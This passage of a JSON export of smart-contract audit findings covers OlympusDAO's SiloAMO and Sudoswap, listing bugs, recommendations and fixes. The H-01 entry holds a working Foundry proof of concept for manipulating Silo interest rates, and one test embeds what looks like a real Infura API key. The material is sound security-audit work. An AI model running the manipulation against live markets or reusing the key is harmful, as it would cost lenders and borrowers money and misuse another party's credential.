      "content": "The new SiloAMO policy is intended to be deployed with the Silo interest rate model at address `0x7e9e7ea94e1ff36e216a703D6D66eCe356a5fd44` (as used in the fork tests and confirmed by the Olympus team).\n\nIf we check that contract address, we can see that the file deployed is `InterestRateModel.sol`.\n\nIf we check [that file in the Silo repo](https://github.com/silo-finance/silo-core-v1/blob/e5d16f201ab2139829d45ed881532c936249d3a5/contracts/InterestRateModel.sol), we can see that it's been edited to include the following line:\n\n```\n/// @notice DEPRECATED. Please use InterestRateModelV2 instead.\n```\n\nWe can confirm this by calling the `getInterestRateModel()` function on the [SiloRepository contract](https://etherscan.io/address/0xd998C35B7900b344bbBe6555cc11576942Cf309d) with the Silo address and the OHM address.\n\n```\ninterface SiloRepository {\nfunction getInterestRateModel(address silo, address ohm) external view returns (IInterestRateModel);\n}\n\ninterface IInterestRateModel {}\n\ncontract InterestRateModelTest is Test {\nSiloRepository rep = SiloRepository(0xd998C35B7900b344bbBe6555cc11576942Cf309d);\n\nfunction testCorrectInterestRateModel() public {\nvm.createSelectFork(\"https://mainnet.infura.io/v3/fb419f740b7e401bad5bec77d0d285a5\");\naddress silo = 0xf5ffabab8f9a6F4F6dE1f0dd6e0820f68657d7Db;\naddress ohm = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;\naddress model = address(rep.getInterestRateModel(silo, ohm));\nconsole.log(model);\n}\n}\n```\n\nThis results in the following output:\n\n```\n0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314\n```\n\n**Recommendation**\n\nThe correct `InterestRateModelV2` address should be used in both fork tests and deployment: 0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314.\n\n**Review**\n\nFixed as recommended in [a605e8ef59d9d91db77ef4ce5097f88b59e2331d](https://github.com/OlympusDAO/bophades/commit/a605e8ef59d9d91db77ef4ce5097f88b59e2331d).",
      "summary": "\nA bug was discovered in the SiloAMO policy intended to be deployed with the Silo interest rate model. The file deployed was `InterestRateModel.sol`, however, it was edited to include a line that indicated it was deprecated and to use InterestRateModelV2 instead. To confirm this, the `getInterestRateModel()` function was called on the SiloRepository contract and the output was 0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314. The recommendation made was to use the correct InterestRateModelV2 address in both fork tests and deployment. The bug was fixed as recommended in the commit a605e8ef59d9d91db77ef4ce5097f88b59e2331d.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18690",
      "title": "[M-01] ohmDeployed will become inaccurate if circulatingOhmBurned is used",
      "impact": "MEDIUM",
      "content": "The OHM deposited to Silo will accure interest over time, which means that the protocol has the potential to withdraw more OHM than is tracked by the `ohmDeployed` value.\n\nThis is expected, and the Policy performs valid adjustments to account for it:\n\n```solidity\nif (ohmDeployed < amount_) circulatingOhmBurned += amount_ - ohmDeployed;\nohmDeployed -= ohmDeployed > amount_ ? amount_ : ohmDeployed;\n```\n\nIf more OHM is withdrawn than was deployed, `ohmDeployed` is set to 0, and the `circulatingOhmBurned` value is incremented as a sort of negative marker for the amount of surplus OHM that was withdrawn.\n\nHowever, in the event that OHM continues to be deployed to the Silo, this `circulatingOhmBurned` value is not used to adjust the `ohmDeployed` value to accurately offset for the previous negative value.\n\nLet's walk through an example:\n\n- 1000 OHM is deployed to the Silo\n- Additional interest is earned, so this value increases to 1010 OHM\n- All 1010 OHM is withdrawn, setting `ohmDeployed = 0` and `circulatingOhmBurned = 10`\n- A new 1000 OHM is deployed\n- We have no deployed 2000 OHM and withdrawn 1010 OHM, which results in a total mint of `2000 - 1010 = 990 OHM`\n- However, `ohmDeployed` will be set to 1000\n\nThis will cause two problems for the protocol:\n\n1. `_canDeposit` will return false for any deposits that push the `ohmDeployed` over the `maximumToDeploy`, even if the total deployed is not actually greater than `maximumToDeploy`. This will cause all such deposits to revert.\n\n2. Any time `update()` is called in a way that would push us over the `maximumToDeploy` will have the amount automatically reduced to `maximumToDeploy - ohmDeployed`, which will lead to too little OHM being deployed relative to the amount set in `maximumToDeploy`.\n\nWhile these differences would be small on a short timescale, as the amount of interest earned increases, the difference can become more and more significant.\n\n**Recommendation**\n\nThe `_deposit()` function should be sure to clear out the `circulatingOhmBurned` before incrementing `ohmDeployed`:\n\n```diff\nfunction _deposit(uint256 amount_) internal {\n// Update state\n+   uint cachedCirculatingOhmBurned = circulatingOhmBurned;\n+   if (cachedCirculatingOhmBurned > amount_) {\n+       circulatingOhmBurned -= amount_;\n+   else if (cachedCirculatingOhmBurn > 0) {\n+       circulatingOhmBurned = 0;\n+       ohmDeployed += amount_ - cachedCirculatingOhmBurned;\n+   } else {\nohmDeployed += amount_;\n+   }\n```\n\n**Review**\n\nFixed as recommended in [8465e3dec2eb8b597851c543cc4b6d4c04006494](https://github.com/OlympusDAO/bophades/commit/8465e3dec2eb8b597851c543cc4b6d4c04006494).",
      "summary": "\nA bug report has been filed regarding the OHM deposited to Silo accruing interest over time. This means that the protocol has the potential to withdraw more OHM than is tracked by the `ohmDeployed` value. The Policy performs valid adjustments to account for it, setting `ohmDeployed` to 0 and incrementing the `circulatingOhmBurned` value as a negative marker for the amount of surplus OHM that was withdrawn. However, if more OHM is deployed to the Silo, this `circulatingOhmBurned` value is not used to adjust the `ohmDeployed` value to accurately offset for the previous negative value.\n\nThis will cause two problems for the protocol: `_canDeposit` will return false for any deposits that push the `ohmDeployed` over the `maximumToDeploy`, even if the total deployed is not actually greater than `maximumToDeploy`, and any time `update()` is called in a way that would push us over the `maximumToDeploy` will have the amount automatically reduced to `maximumToDeploy - ohmDeployed`, which will lead to too little OHM being deployed relative to the amount set in `maximumToDeploy`.\n\nThe bug has been fixed by adjusting the `_deposit()` function to clear out the `circulatingOhmBurned` before incrementing `ohmDeployed`. This ensures that the `ohmDeployed` value will accurately reflect the amount of OHM that has been deployed to the Silo.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18689",
      "title": "[H-04] AMO model opens up OHM treasury to increased risk",
      "impact": "HIGH",
      "content": "While H-01 and H-02 describe specific ways that users might manipulate the AMO for their own gain, there is a more general risk associated with connecting the OHM `MINTR` with an external contract in an automated way.\n\nIn essence, what the SiloAMO is doing is using the externally set `uopt` value as an input that directly feeds to `MINTR` to determine new OHM deployed to the market.\n\nThe `uopt` value is determined by the Silo Finance team and not by the market. Markets are expected to function because users are self interested and weighing information, and the balance of users on both sides leads to rates, liquidity, and risks that these individuals deem appropriate. Blunting the market's judgment with automation is a risky proposition.\n\nAs an example of how this could cause a problem, imagine there is an exploit on Silo Finance that allows OHM to be drained. Instead of simply stealing what is in the Silo, the AMO provides the hacker with a tap directly into the `MINTR` contract to steal additional OHM.\n\nSimilar risks exist in less extreme situations, where conditions might encourage the market to shift in a way that the AMO doesn't allow. For example, in the event of an XAI depeg, all XAI depositors would want to maximize borrows against their assets. This would usually max out the borrows of OHM in the Silo, but the direct tap into the `MINTR` would provide exit liquidity for more XAI holders.\n\n**Recommendation**\n\nSimilar to H-01 and H-02, there are a number of possible solutions, but my preferred solution is to impose bounds on the `update()` function to only operate when `uopt` is between `ulow` and `ucrit`.\n\nIn the event that the utilization rate falls outside of these bounds, a manual call to `deposit()` or `withdraw()` will need to be made by the Olympus team to restart the AMO.\n\nThis effectively ensures that, in any extreme market conditions, the AMO will turn off and not be exploitable.",
      "summary": "\nThe bug report is about the risk associated with connecting the OHM `MINTR` with an external contract in an automated way. The SiloAMO is using the externally set `uopt` value as an input that directly feeds to `MINTR` to determine new OHM deployed to the market. This could lead to an exploit where a hacker could tap into the `MINTR` contract to steal additional OHM. In addition, conditions could encourage the market to shift in a way that the AMO doesn't allow. To prevent this, the recommendation is to impose bounds on the `update()` function to only operate when `uopt` is between `ulow` and `ucrit`. In the event that the utilization rate falls outside of these bounds, a manual call to `deposit()` or `withdraw()` will need to be made by the Olympus team to restart the AMO. This will ensure that the AMO will not be exploitable in any extreme market conditions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18688",
      "title": "[H-03] Yield cannot be harvested because wrong token is passed to Incentives Controller",
      "impact": "HIGH",
      "content": "In order to harvest rewards from Silo, the SiloAMO contains a `harvestYield()` function. This function checks the rewards balance of the contract, and then calls `claimRewards()` to claim them.\n\n```solidity\nfunction harvestYield() external {\nISiloIncentivesController incentivesController_ = ISiloIncentivesController(\nincentivesController\n);\n\naddress[] memory assets = new address[](1);\nassets[0] = address(OHM);\n\n// Get claimable rewards\nuint256 claimableRewards = incentivesController_.getRewardsBalance(assets, address(this));\n\n// Claim rewards\nif (claimableRewards > 0)\nincentivesController_.claimRewards(assets, claimableRewards, address(this));\n}\n```\n\nCurrently, the `harvestYield()` function is set to use the `OHM` token. However, Silo does not pay incentives based on the underlying token, but rather based on the collateral and debt tokens associated with it.\n\nWe can see this because, in [BaseIncentivesController.sol](https://github.com/silo-finance/silo-core-v1/blob/master/contracts/external/aave/incentives/base/BaseIncentivesController.sol), we get the total amount staked by the user and in total by calling `_getScaledUserBalanceAndSupply()`. This incentive mechanism is taken from Aave, who returns the staked values with this function.\n\nHowever, looking at the function implementation on [SiloIncentivesController.sol](https://github.com/silo-finance/silo-core-v1/blob/master/contracts/incentives/SiloIncentivesController.sol), these values are calculated by simply taking the user's balance and the `totalSupply()`. This works because all collateral and debt tokens are all considered \"staked\" (because they represent use of the Silo), whereas underlying tokens are not.\n\nWe can verify this on the live deployment of this contract at [0x6c1603aB6CecF89DD60C24530DdE23F97DA3C229](https://etherscan.io/address/0x6c1603aB6CecF89DD60C24530DdE23F97DA3C229). Currently, there are only emissions being paid on the debt token, however, if we use a previous block (`17407114`), we can see that emissions were paid on both the collateral and debt tokens, but not on the underlying or collateral only tokens.\n\n```solidity\ncontract SiloRewardsTest is Test {\naddress ohm = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;\naddress collateralToken = 0x907136B74abA7D5978341eBA903544134A66B065;\naddress collateralOnlyToken = 0xFDdfEd73b29B8859c6AE234aD64E2841614De559;\naddress debtToken = 0x85A44Ff42F6B89125a541F64c77840977b0097E2;\n\nSiloIncentivesController incentives = SiloIncentivesController(0x6c1603aB6CecF89DD60C24530DdE23F97DA3C229);\n\nfunction testWhichTokensHaveIncentives() public {\nvm.createSelectFork(\"RPC_URL\", 17407114);\nuint104 emissionsPerSecond;\n\n(emissionsPerSecond,,) = incentives.assets(ohm);\nconsole.log(\"OHM: \", emissionsPerSecond);\n\n(emissionsPerSecond,,) = incentives.assets(collateralToken);\nconsole.log(\"Collateral: \", emissionsPerSecond);\n\n(emissionsPerSecond,,) = incentives.assets(collateralOnlyToken);\nconsole.log(\"Collateral Only: \", emissionsPerSecond);\n\n(emissionsPerSecond,,) = incentives.assets(debtToken);\nconsole.log(\"Debt: \", emissionsPerSecond);\n}\n}\n```\n\n```\nLogs:\nOHM:  0\nCollateral:  6430041152263380\nCollateral Only:  0\nDebt:  38580246913580\n```\n\n**Recommendation**\n\nAdjust the `harvestYield()` function to use the `collateralToken` that will be owned by the Policy (0x907136B74abA7D5978341eBA903544134A66B065) rather than the `OHM` token.\n\n**Review**\n\nFixed as recommended in [8cc65de58ed541d95e5998a26c77ded2367b79d1](https://github.com/OlympusDAO/bophades/commit/8cc65de58ed541d95e5998a26c77ded2367b79d1).",
      "summary": "\nThe bug report describes an issue with the SiloAMO's `harvestYield()` function, which is set to use the `OHM` token. However, Silo does not pay incentives based on the underlying token, but rather based on the collateral and debt tokens associated with it. This can be seen by looking at the implementation of the `_getScaledUserBalanceAndSupply()` function in BaseIncentivesController.sol, which returns the total amount staked by the user and in total. However, in SiloIncentivesController.sol, these values are calculated by simply taking the user's balance and the `totalSupply()`. This works because all collateral and debt tokens are all considered \"staked\", whereas underlying tokens are not. This can be verified on the live deployment of the contract at 0x6c1603aB6CecF89DD60C24530DdE23F97DA3C229.\n\nThe recommendation is to adjust the `harvestYield()` function to use the `collateralToken` that will be owned by the Policy (0x907136B74abA7D5978341eBA903544134A66B065) rather than the `OHM` token. This has been fixed as recommended in 8cc65de58ed541d95e5998a26c77ded2367b79d1.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18687",
      "title": "[H-02] If AMO becomes primary depositor of Silo, user can force withdrawals to get inflated interest rates",
      "impact": "HIGH",
      "content": "This issue is the inverse of [H-01], where the SiloAMO can be forced to deposit additional funds, decreasing rates for borrowers until 1 day later when `update()` can be called again.\n\nIn this case, we can imagine a situation where the SiloAMO becomes the primary depositor in the market. This is likely, as there is no reason to believe the market equilibrium for depositing OHM will align with the `uopt` and the interest rate at a near-optimal value calculated using `ki`. AMOs allow the rates determined by the protocol to become the market rates, whether or not the market agrees with these rates.\n\nIn the event that the majority of the deposited OHM is from the AMO, a user can manipulate the AMO to withdraw their funds, leading to a critically overutilized supply and dramatically increased interest rates.\n\nA user who is a depositor of OHM in the pool could do this to benefit from the increased interest rates.\n\nAs a simple example of what this might look like:\n\n- There is 100,000 OHM in the pool, close to all of which comes from the AMO\n- Given the 50% optimal utilization rate, this means that 50,000 is borrowed\n- A user deposits 100,000 OHM to the system\n- The next block, they call `update()`, which causes the AMO to withdraw all its funds to maintain equilibrium\n- The user then withdraws 50,000 OHM, leading to a utilization rate of 100% and massive interest rates\n\nThe `update()` function cannot be called again, and the market will need to wait for other users to jump in and fund deposits, or else regular borrowers of OHM will dramatically overpay for their borrows.\n\nThis sequence of events could be repeated daily, or even alternated with #155, making the market unusable for regular users.\n\n**Recommendation**\n\nFollowing any of the recommended fixes for H-01 will solve this issue as well.\n\n**Review**\n\nFixed as recommended in [4bce45602daa4ee49b1ef52acf6f88021d1390d7](https://github.com/OlympusDAO/bophades/commit/4bce45602daa4ee49b1ef52acf6f88021d1390d7).",
      "summary": "\nThis bug report discusses an issue related to the SiloAMO, which is a protocol used to calculate interest rates for borrowers. The issue is that a user can manipulate the AMO to withdraw funds, leading to a critically overutilized supply and dramatically increased interest rates. This can be done by depositing a large amount of OHM, which causes the AMO to withdraw all of its funds, followed by the user withdrawing a portion of the funds. This sequence of events can be repeated daily, and if not fixed, can make the market unusable for regular users.\n\nThe recommended fix is to follow any of the recommended fixes for H-01, which is the inverse of this issue. The bug has been fixed as recommended in the commit 4bce45602daa4ee49b1ef52acf6f88021d1390d7.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18686",
      "title": "[H-01] SiloAMO can be forced to fund reduced interest rates by manipulating utilization",
      "impact": "HIGH",
      "content": "When `update()` is permissionlessly called on the SiloAMO, it decides whether to deposit or withdraw funds by comparing the `totalDeposits` to an \"ideal\" amount of deposits that is calculated by multiplying the `totalBorrows` by `uopt` (the optimal utilization rate set on the Silo).\n\n```solidity\nfunction _update() internal {\n// Accrue interest on Silo\nISilo(market).accrueInterest(address(OHM));\n\n// Get current total deposits and target total deposits\nISilo.AssetStorage memory assetStorage = ISilo(market).assetStorage(address(OHM));\nuint256 currentDeployment = getUnderlyingOhmBalance();\nuint256 totalDeposits = assetStorage.totalDeposits;\nuint256 targetDeploymentAmount = getTargetDeploymentAmount();\n\nif (targetDeploymentAmount < totalDeposits) {\n// If the target deployment amount is less than the total deposits, then we need to withdraw the difference\nuint256 amountToWithdraw = totalDeposits - targetDeploymentAmount;\nif (amountToWithdraw > currentDeployment) amountToWithdraw = currentDeployment;\n\nif (amountToWithdraw > 0) _withdraw(amountToWithdraw);\n} else if (targetDeploymentAmount > totalDeposits) {\n// If the target deployment amount is greater than the total deposits, then we need to deposit the difference\nuint256 amountToDeposit = targetDeploymentAmount - totalDeposits;\nif (amountToDeposit > maximumToDeploy - ohmDeployed)\namountToDeposit = maximumToDeploy - ohmDeployed;\n\nif (amountToDeposit > 0) _deposit(amountToDeposit);\n}\n}\n\n```\n\nIf a user is able to manipulate `totalBorrows` up, it can bait the SiloAMO into depositing substantially more funds into the Silo.\n\nThis is an issue, because `update()` can only be called once every `updateInterval` (currently set to 1 day in fork tests). This means that if a user is able to force SiloAMO to deposit additional funds (thus lowering the interest rate), the funds will remain in the Silo for at least one day.\n\nIn order to protect against this possibility, the SiloAMO checks if the interest rate timestamp has been updated in the current block. If it has, it does not allow `update()` to be called:\n\n```solidity\nISilo.UtilizationData memory utilizationData = ISilo(market).utilizationData(address(OHM));\nif (utilizationData.interestRateTimestamp == block.timestamp)\nrevert AMO_UpdateReentrancyGuard(address(this));\n```\n\nWhile this successfully protects against flash loans, it does not protect against a similar attack that occurs with an attacker's own funds.\n\nHere is a simple flow of what this might look like:\n\n- An attacker deposits a large amount of WETH or XAI into the OHM Silo (or, with slightly more effort, deposit a smaller amount of WETH or XAI, borrow OHM, trade it for WETH or XAI, and use this pattern to create a leveraged borrow position)\n- The block before `update()` is allowed to be called, they take a large borrow of OHM\n- This increases the interest rate, but puts `totalDeposits` far below the optimal utilization rate\n- The next block, they call `update()`, which causes SiloAMO to deposit a large amount of OHM\n- Immediately after this transaction, the user repays their borrowed OHM, minimizing interest costs\n\nThe result is that the interest rates will be forced down for a full day. This attack can be repeated daily in order to keep the interest rate deflated.\n\n**Proof of Concept**\n\nI've put together the following standalone fork test to model this situation. It can be dropped into your current test suite and run with the relevant interfaces imported and RPC_URL inserted.\n\n```solidity\ncontract TestInterestRateManipulation is Test {\nusing FullMath for uint256;\n\nISilo silo = ISilo(0xf5ffabab8f9a6F4F6dE1f0dd6e0820f68657d7Db);\nIERC20 ohm = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);\nIERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\naddress shareCollToken = 0x907136B74abA7D5978341eBA903544134A66B065;\nIInterestRateModel model = IInterestRateModel(0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314);\naddress amo = makeAddr(\"policy\");\n\nfunction testInterestRateManipulation() public {\nvm.createSelectFork(\"RPC_URL\");\ndeal(address(weth), address(this), 10_000e18);\nweth.approve(address(silo), 10_000e18);\ndeal(shareCollToken, amo, 10_000e18);\nvm.startPrank(amo);\nIERC20(shareCollToken).approve(address(silo), 10_000e18);\nohm.approve(address(silo), 100_000e9);\nvm.stopPrank();\ndeal(address(ohm), address(this), 100_000e9);\nohm.approve(address(silo), 100_000e9);\ndeal(address(ohm), amo, 100_000e9);\n\n// the starting rate for the silo\n_update();\nconsole.log(\"Starting Rate: \", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));\n\n// we make a large borrow, which pushes rates up but also baits the amo into depositing a large amount of OHM\nsilo.deposit(address(weth), 10_000e18, false);\n(uint borrowAmt,) = silo.borrow(address(ohm), silo.liquidity(address(ohm)));\nconsole.log(\"Rate After OHM Borrow: \", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));\n\n// wait one block so that update() is allowed to be called\nvm.warp(block.timestamp + 12);\n\n// now we force update()\n_update();\nconsole.log(\"Rate After Update: \", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));\n\n// we immediately repay our borrow to minimize interest costs\nsilo.repay(address(ohm), borrowAmt);\nvm.warp(block.timestamp + 12);\nconsole.log(\"Rate After Repayment: \", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));\n\n// this reduced rate is now locked in for 1 day\n}\n\nfunction _update() internal {\nuint256 totalDeposits = silo.assetStorage(address(ohm)).totalDeposits;\nuint256 totalBorrowed = silo.utilizationData(address(ohm)).totalBorrowAmount;\nint256 optimalUtilizationPct = 0.5e18; // hardcoded what it is on the contract\nuint targetDeploymentAmount = totalBorrowed.mulDiv(1e18, uint256(optimalUtilizationPct));\nvm.prank(amo);\nif (totalDeposits < targetDeploymentAmount) {\nsilo.deposit(address(ohm), targetDeploymentAmount - totalDeposits, false);\n} else if (totalDeposits > targetDeploymentAmount) {\nsilo.withdraw(address(ohm), totalDeposits - targetDeploymentAmount, false);\n}\n}\n}\n```\n\n```\nLogs:\nStarting Rate:  70000385185008000 // 7% per year\nRate After OHM Borrow:  1139999999984496000 // 114% per year\nRate After Update:  140027777674272000 // 14% per year\nRate After Repayment:  34097713619616000 // 3.4% per year\n```\n\nWhile the POC is written to assume that the attacker holds approximately $500k of WETH in the Silo, the attack is possible with a much smaller balance because of the ability for the attacker to take a leveraged position. They can do this by depositing WETH, borrowing OHM, trading the OHM for WETH which can be deposited, borrowing more OHM, etc. The amount of leverage that can be taken depends on the maximum LTV value, as follows:\n\n```\n0.9 LTV = 9x\n0.85 LTV = 5.66x\n0.8 LTV = 4x\n0.75 LTV = 3x\n0.7 LTV = 2.33x\n0.6 LTV = 1.5x\n```\n\nThis would allow an attacker to perform this attack with substantially less capital than might otherwise be expected.\n\nFurther, despite the capital requirements, the attack itself poses no additional risk to their funds. We can estimate the interest paid for the one block of the attack as:\n\n```\n45,000 OHM = $480,000 USD\n$480,000 USD * 114% annual rate = $547,200 USD per year of interest\n$547,200 USD / 365 days / 7200 blocks per day = $0.21\n```\n\n**Recommendation**\n\nThis is a tricky problem, but I see three possible solutions, listed in order of my preference:\n\n1. Impose bounds on the `update()` function to only operate when `uopt` is between `ulow` and `ucrit`. In the event that the utilization rate falls outside of these bounds, a manual call to `deposit()` or `withdraw()` will need to be made by the Olympus team to restart the AMO. Since the [Silo Interest Rate Curve](https://silopedia.silo.finance/interest-rates/how-is-interest-calculated) is very flat between these values, this will ensure that no major manipulation can be performed.\n\n2. Adjust the system to be permissioned, with `update()` only callable by the `lendingamo_admin`. While this will remove a lot of the benefits of a permissionless system, combining it with the current checks that the Silo has not been adjusted in the current block, it will provide a strong defense against any tampering.\n\n3. Implement a maximum `stepSize` percentage, which will only allow the AMO to nudge the Silo in the direction of equilibrium, rather than adjust it all the way to `uopt`. However, this has the downside of removing a lot of the incentive for a user to call `update()`, because they will need to call it daily for multiple days to adjust the rate fully, which most users won't be willing to do in order to get a preferred rate on a loan.\n\n**Review**\n\nInitially fixed following the first recommendation in [4bce45602daa4ee49b1ef52acf6f88021d1390d7](https://github.com/OlympusDAO/bophades/commit/4bce45602daa4ee49b1ef52acf6f88021d1390d7).\n\nHowever, during the fix review, it was uncovered that bounding the `util` within the `ulow` to `ucrit` range before the update would not guarantee such a bound after the update. [See the logic in this writeup for an explanation](https://gist.github.com/zobront/d4a1507b1872b29392ca7d598a6fd3f1).\n\nThis was fixed in [9b2d78b0bca85389f59b099e3c32ca29f21866b3](https://github.com/OlympusDAO/bophades/pull/131/commits/9b2d78b0bca85389f59b099e3c32ca29f21866b3) by implementing the recommended functions to calculate the appropriate `min` and `max` values.\n\nHowever, [fuzzing the values](https://gist.github.com/zobront/aa4ed40a03f08f3de43ae4b6083af82f) showed there was some loss of precision in the calculations that could allow values slightly outside the bounds. Additional precisions and bound checks were added in [58d04cbd193c957924c14d20fd3889a99955b8c2](https://github.com/OlympusDAO/bophades/pull/131/commits/58d04cbd193c957924c14d20fd3889a99955b8c2), which led to the desired behavior.",
      "summary": "\nA bug was identified when permissionlessly calling the SiloAMO's `update()` function, which could allow an attacker to manipulate the total borrows and bait the SiloAMO into depositing substantially more funds into the Silo. This could cause the interest rate to be forced down for a full day. To protect against this, the SiloAMO checks if the interest rate timestamp has been updated in the current block. However, this does not protect against a similar attack that occurs with an attacker's own funds.\n\nA proof of concept was provided to model this situation, showing that the attack could be performed with substantially less capital than might otherwise be expected, and the interest paid for the one block of the attack would be minimal.\n\nThree possible solutions were recommended, with the first being the most preferred. This solution would impose bounds on the `update()` function to only operate when `uopt` is between `ulow` and `ucrit`. This would ensure that no major manipulation can be performed.\n\nThe bug was initially fixed following the first recommendation, however, during the review, it was uncovered that bounding the `util` within the `ulow` to `ucrit` range before the update would not guarantee such a bound after the update. This was fixed by implementing the recommended functions to calculate the appropriate `min` and `max` values, with additional precisions and bound checks added to ensure the desired behavior.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Olympusdao",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-06-23-OlympusDAO.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18430",
      "title": "Cache local variable earlier in `LSSVMPairERC20::_pullTokenInputs`",
      "impact": "GAS",
      "content": "Given that there are multiple instances where `token()` is called directly, the local variable `ERC20 token_ = token()` should be cached in the same manner as `_assetRecipient` at the start of the function to reduce the number of storage reads.\n\nIt is also recommended to cache `factory()` in `LSSVMPairERC1155::swapTokenForSpecificNFTs` and `LSSVMPairERC721::swapTokenForSpecificNFTs`. There is no need to cache `poolType()` in `LSSVMPairERC1155::swapNFTsForToken`, `LSSVMPairERC721::swapTokenForSpecificNFTs` and `LSSVMPairERC721::_swapNFTsForToken` as it is used only once.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18429",
      "title": "Simplify `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams` and `LSSVMPair::_calculateSellInfoAndUpdatePoolParams` conditionals",
      "impact": "GAS",
      "content": "Per the comment \"Consolidate writes to save gas\" in `LSSVMPair::_calculateBuyInfoAndUpdatePoolParams`, further optimizations can be made by reducing the logic to two if statements and storing values/emitting events together as follows:\n```solidity\n// Consolidate writes to save gas\n// Emit spot price update if it has been updated\nif (currentSpotPrice != newSpotPrice) {\n    spotPrice = newSpotPrice;\n    emit SpotPriceUpdate(newSpotPrice);\n}\n\n// Emit delta update if it has been updated\nif (currentDelta != newDelta) {\n    delta = newDelta;\n    emit DeltaUpdate(newDelta);\n}\n```\nThe same recommendation applies to `LSSVMPair::_calculateSellInfoAndUpdatePoolParams`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18428",
      "title": "Redundant zero value check in `LSSVMPair::getBuyNFTQuote` and `LSSVMPair::getSellNFTQuote`",
      "impact": "GAS",
      "content": "The `numNFTs` argument to `LSSVMPair::getBuyNFTQuote` is validated to be a non-zero value; however, in `ICurve::getBuyNFTQuote`, all current implementations revert if the `numItems` parameter is zero, and so this check on the pair is redundant. The same reasoning applies to `LSSVMPair::getSellNFTQuote`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18427",
      "title": "Redundant zero address check in `LSSVMPair::initialize`",
      "impact": "GAS",
      "content": "The initializer argument `_assetRecipient` is assigned to the state variable only if it is not the zero address; however, in `LSSVMPair::getAssetRecipient`, the owner address is returned if `assetRecipient` is the zero address, and so this check is redundant. The default value is `address(0)`, and it will only be used in the `LSSVMPair::getAssetRecipient` function. For `LSSVMPair::getFeeRecipient`, fees will accrue on the pair contract itself in the case of a zero address asset recipient.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18426",
      "title": "`MerklePropertyChecker::hasProperties` does not validate `ids.length` equals `proofList.length`",
      "impact": "LOW",
      "content": "This function loops over supplied ids and performs proof verification to ensure each id is valid.\nIf additional proofs are supplied, the loop will terminate before these are reached and so they are never used in verification, but it is generally best practice to validate array lengths are equal.\n\n**Sudoswap:**\nFixed in commit [0f8f94](https://github.com/sudoswap/lssvm2/pull/113/commits/0f8f94872743d67c304b310d22c653c8d75d80ea).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
